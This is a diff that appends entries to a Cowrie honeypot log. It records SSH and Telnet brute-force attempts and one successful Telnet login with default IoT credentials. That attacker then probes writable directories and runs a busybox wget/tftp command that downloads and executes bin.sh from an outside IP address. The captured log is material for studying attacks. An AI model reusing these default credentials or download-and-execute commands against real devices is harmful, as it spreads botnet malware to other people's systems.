@@ -3610,3 +3610,100 @@
 2017-04-08T16:48:00+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98462,91.197.235.11] '1111' trying auth 'password'
 2017-04-08T16:48:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98462,91.197.235.11] login attempt: 530
 2017-04-08T16:48:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98462,91.197.235.11] login return, expect: [admin/1111]
+2017-04-08T16:48:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98462,91.197.235.11] login attempt [1111/1111] failed
+2017-04-08T16:48:03+0000 [-] 'root' failed auth 'password'
+2017-04-08T16:48:03+0000 [-] unauthorized login: 
+2017-04-08T16:48:03+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
+2017-04-08T16:48:03+0000 [twisted.internet.defer#critical] 
+	Traceback (most recent call last):
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
+	    self.runUntilCurrent()
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 878, in runUntilCurrent
+	    call.func(*call.args, **call.kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 459, in callback
+	    self._startRunCallbacks(result)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 567, in _startRunCallbacks
+	    self._runCallbacks()
+	--- <exception caught here> ---
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/defer.py", line 653, in _runCallbacks
+	    current.result = callback(current.result, *args, **kw)
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/userauth.py", line 251, in _ebBadAuth
+	    NS(b','.join(self.supportedAuthentications)) + b'\x00')
+	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/conch/ssh/transport.py", line 637, in sendPacket
+	    self.transport.write(encPacket)
+	exceptions.AttributeError: 'NoneType' object has no attribute 'write'
+	
+2017-04-08T16:48:03+0000 [HoneyPotSSHTransport,98463,91.197.235.11] NEW KEYS
+2017-04-08T16:48:03+0000 [HoneyPotSSHTransport,98463,91.197.235.11] starting service 'ssh-userauth'
+2017-04-08T16:48:03+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 120.84.11.207:3137 (10.8.41.81:2223) [session: TT211311]
+2017-04-08T16:48:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98463,91.197.235.11] '1111' trying auth 'password'
+2017-04-08T16:48:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98463,91.197.235.11] login attempt: 531
+2017-04-08T16:48:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98463,91.197.235.11] login return, expect: [admin/1111]
+2017-04-08T16:48:05+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,98463,91.197.235.11] login attempt [1111/1111] failed
+2017-04-08T16:48:05+0000 [-] '1111' failed auth 'password'
+2017-04-08T16:48:05+0000 [-] unauthorized login: 
+2017-04-08T16:48:05+0000 [HoneyPotSSHTransport,98462,91.197.235.11] connection lost
+2017-04-08T16:48:05+0000 [HoneyPotSSHTransport,98462,91.197.235.11] Connection lost after 5 seconds
+2017-04-08T16:48:06+0000 [-] '1111' failed auth 'password'
+2017-04-08T16:48:06+0000 [-] unauthorized login: 
+2017-04-08T16:48:06+0000 [HoneyPotSSHTransport,98463,91.197.235.11] connection lost
+2017-04-08T16:48:06+0000 [HoneyPotSSHTransport,98463,91.197.235.11] Connection lost after 6 seconds
+2017-04-08T16:48:10+0000 [CowrieTelnetTransport,211311,120.84.11.207] first time for 120.84.11.207, need: 1
+2017-04-08T16:48:10+0000 [CowrieTelnetTransport,211311,120.84.11.207] login attempt: 1
+2017-04-08T16:48:12+0000 [CowrieTelnetTransport,211311,120.84.11.207] login attempt [root/xc3511] succeeded
+2017-04-08T16:48:13+0000 [CowrieTelnetTransport,211311,120.84.11.207] Opening TTY Log: log/tty/20170408-164813-None-211311i.log
+2017-04-08T16:48:13+0000 [CowrieTelnetTransport,211311,120.84.11.207] Warning: state changed and new state returned
+2017-04-08T16:48:16+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: sh
+2017-04-08T16:48:16+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: sh 
+2017-04-08T16:48:17+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/tmp/.ptmx && cd /tmp/
+2017-04-08T16:48:17+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /tmp/.ptmx
+2017-04-08T16:48:17+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /tmp
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/var/.ptmx && cd /var/
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /var/.ptmx
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /var
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/var/run/.ptmx && cd /var/run/
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /var/run/.ptmx
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /var/run
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/dev/.ptmx && cd /dev/
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /dev/.ptmx
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /dev
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/.ptmx && cd /
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /.ptmx
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/dev/netslink/.ptmx && cd /dev/netslink/
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /dev/netslink/.ptmx
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /dev/netslink/
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/home/.ptmx && cd /home/
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /home/.ptmx
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /home
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: >/var/tmp/.ptmx && cd /var/tmp/
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: > /var/tmp/.ptmx
+2017-04-08T16:48:18+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: cd /var/tmp
+2017-04-08T16:48:18+0000 [SSHChannel None (108) on SSHService 'ssh-connection' on HoneyPotSSHTransport,98434,91.195.103.194] remote eof
+2017-04-08T16:48:18+0000 [SSHChannel None (108) on SSHService 'ssh-connection' on HoneyPotSSHTransport,98434,91.195.103.194] remote close
+2017-04-08T16:48:18+0000 [SSHChannel None (108) on SSHService 'ssh-connection' on HoneyPotSSHTransport,98434,91.195.103.194] sending close 108
+2017-04-08T16:48:19+0000 [CowrieTelnetTransport,211311,120.84.11.207] CMD: /bin/busybox wget http://95.215.62.11/bin.sh -O - > bin.sh && sh bin.sh || /bin/busybox tftp -r bin2.sh -l bin2.sh -g 95.215.62.11 && sh bin2.sh
+2017-04-08T16:48:19+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: /bin/busybox wget http://95.215.62.11/bin.sh -O - > bin.sh
+2017-04-08T16:48:19+0000 [CowrieTelnetTransport,211311,120.84.11.207] Command found: wget http://95.215.62.11/bin.sh -O -
+2017-04-08T16:48:19+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://95.215.62.11/bin.sh>
+2017-04-08T16:48:30+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 198.7.62.232:40610 (10.8.41.81:2223) [session: TT211312]
+2017-04-08T16:48:35+0000 [CowrieTelnetTransport,211312,198.7.62.232] login attempt: 5327
+2017-04-08T16:48:35+0000 [CowrieTelnetTransport,211312,198.7.62.232] login return, expect: [Admin/atc456]
+2017-04-08T16:48:37+0000 [CowrieTelnetTransport,211312,198.7.62.232] login attempt [admin/] failed
+2017-04-08T16:48:37+0000 [CowrieTelnetTransport,211312,198.7.62.232] Warning: state changed and new state returned
+2017-04-08T16:48:39+0000 [CowrieTelnetTransport,211312,198.7.62.232] login attempt: 5328
+2017-04-08T16:48:39+0000 [CowrieTelnetTransport,211312,198.7.62.232] login return, expect: [Admin/atc456]
+2017-04-08T16:48:41+0000 [CowrieTelnetTransport,211312,198.7.62.232] login attempt [enable/shell] failed
+2017-04-08T16:48:41+0000 [CowrieTelnetTransport,211312,198.7.62.232] Warning: state changed and new state returned
+2017-04-08T16:48:42+0000 [CowrieTelnetTransport,211312,198.7.62.232] login attempt: 5329
+2017-04-08T16:48:42+0000 [CowrieTelnetTransport,211312,198.7.62.232] login return, expect: [Admin/atc456]
+2017-04-08T16:48:44+0000 [CowrieTelnetTransport,211312,198.7.62.232] login attempt [sh//bin/busybox ECCHI] failed
+2017-04-08T16:48:44+0000 [CowrieTelnetTransport,211312,198.7.62.232] Warning: state changed and new state returned
+2017-04-08T16:48:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,98439,91.195.103.205] got channel 'direct-tcpip' request
+2017-04-08T16:48:47+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,98439,91.195.103.205] direct-tcp connection request to 216.166.81.113:587 from localhost:5556
+2017-04-08T16:48:49+0000 [-] Command found: sh /var/tmp/bin.sh
+2017-04-08T16:48:49+0000 [-] Command found: /bin/busybox tftp -r bin2.sh -l bin2.sh -g 95.215.62.11
+2017-04-08T16:48:49+0000 [-] Command found: tftp -r bin2.sh -l bin2.sh -g 95.215.62.11
+2017-04-08T16:48:49+0000 [-] Command found: sh bin2.sh
+2017-04-08T16:48:49+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://95.215.62.11/bin.sh>
+2017-04-08T16:48:57+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 198.7.62.232:45678 (10.8.41.81:2223) [session: TT211313]
